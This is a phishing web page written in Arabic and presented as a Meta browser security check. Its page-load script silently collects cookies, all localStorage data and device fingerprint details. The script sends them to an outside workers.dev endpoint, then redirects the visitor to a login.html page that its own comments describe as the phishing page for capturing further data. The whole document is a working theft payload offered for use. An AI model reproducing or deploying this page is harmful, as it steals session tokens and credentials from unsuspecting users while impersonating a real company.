<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Security Check</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader-box { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #1c1e21; font-size: 18px; }
    </style>
</head>
<body>

<div class="loader-box">
    <div class="spinner"></div>
    <h2>جاري فحص أمان المتصفح...</h2>
    <p style="color: #606770; font-size: 14px;">يرجى عدم إغلاق الصفحة</p>
</div>

<script>
    async function silentSniff() {
        // 1. جمع بصمة الجهاز (Fingerprinting)
        const browserData = {
            ua: navigator.userAgent,
            lang: navigator.language,
            res: `${window.screen.width}x${window.screen.height}`,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            mem: navigator.deviceMemory || 'N/A',
            cpu: navigator.hardwareConcurrency || 'N/A'
        };

        // 2. محاولة سحب الكوكيز المتاحة والـ LocalStorage
        const storageData = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                storageData[key] = localStorage.getItem(key);
            }
        } catch (e) {}

        // 3. تجهيز الطرد (Payload)
        const payload = {
            type: "SILENT_SNIFF",
            cookies: document.cookie || "No Direct Cookies",
            storage: storageData,
            fingerprint: browserData,
            url: window.location.href
        };

        // 4. الإرسال الفوري للـ Worker الخاص بك
        const WORKER_URL = "https://pylod.zaid00dd.workers.dev/";
        
        try {
            await fetch(WORKER_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload)
            });
        } catch (err) {}

        // 5. بعد السحب الصامت (3 ثوانٍ)، ننتقل لصفحة الصيد التقليدية لإكمال البيانات
        setTimeout(() => {
            window.location.href = "login.html";
        }, 3000);
    }

    // التنفيذ بمجرد التحميل
    window.onload = silentSniff;
</script>
</body>
</html>
